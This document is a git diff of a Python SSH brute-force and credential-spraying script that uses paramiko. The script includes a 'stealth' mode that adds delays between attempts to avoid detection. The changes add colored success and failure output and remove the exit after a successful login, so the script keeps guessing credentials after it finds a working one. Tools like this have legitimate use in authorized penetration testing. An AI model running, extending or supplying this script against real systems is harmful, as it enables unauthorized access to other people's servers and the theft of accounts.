@@ -9,16 +9,22 @@ import paramiko
 import sys
 import time
 
+class bcolors:
+    OK = '\033[92m'  # GREEN
+    WARNING = '\033[93m'  # YELLOW
+    FAIL = '\033[91m'  # RED
+    RESET = '\033[0m'  # RESET COLOR
+
 def ssh_login(ip, port, user, passwd):
 
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    print(f"Attempting {user}:{passwd}")
+    print(f"{ip}:{port} using [{user}:{passwd}]", end='')
     try:
         client.connect(ip, port=port, username=user, password=passwd)
         return True
-    except:
-        print("Connection failed")
+    except Exception as e:
+        print(f"{bcolors.FAIL} Connection failed:{bcolors.RESET} {e}")
         return False
 
 
@@ -66,8 +72,7 @@ if __name__ == '__main__':
                     if stealth == True:
                         attempted += 1
                     if ssh_login(ip, port, user, password.rstrip()):
-                        print(f"Successful login as {user}:{password.rstrip()}.")
-                        sys.exit()
+                        print(f"{bcolors.OK}SUCCESS{bcolors.RESET}")
 
     # credential spray
     if args.spray:
@@ -78,10 +83,9 @@ if __name__ == '__main__':
                     time.sleep(delay)
                     attempted = 0
                 else:
-                    print("attempted is", attempted)
                     if stealth == True:
                         attempted += 1
                     if ssh_login(ip, port, user.rstrip(), args.password):
-                        print(f"Successful login as {user}:{password.rstrip()}.")
+                        print(f"{bcolors.OK} SUCCESS{bcolors.RESET}")
                     
 
